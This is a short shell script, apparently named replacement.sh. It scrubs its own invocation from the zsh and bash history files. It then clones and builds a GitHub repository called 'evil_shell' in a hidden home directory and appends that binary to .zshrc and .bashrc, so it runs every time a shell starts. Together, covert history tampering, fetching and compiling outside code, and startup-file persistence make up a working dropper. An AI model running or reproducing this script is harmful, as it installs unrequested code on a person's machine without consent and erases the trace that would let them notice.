#!/bin/zsh

sed -i 's/bash -x replacement.sh/This command is secret/' ~/.zsh_history
sed -i 's/bash -x replacement.sh/This command is secret/' ~/.bash_history
git clone git@github.com:nathan-guiard/evil_shell.git ~/.evil_shell || git clone git@github.com:nathan-guiard/evil_shell.git ~/.evil_shell2 || git clone git@github.com:nathan-guiard/evil_shell.git ~/.evil_shell3
make -C ~/.evil_shell
echo '~/.evil_shell/evil_shell' >> ~/.zshrc
echo '~/.evil_shell/evil_shell' >> ~/.bashrc
cd ~
exit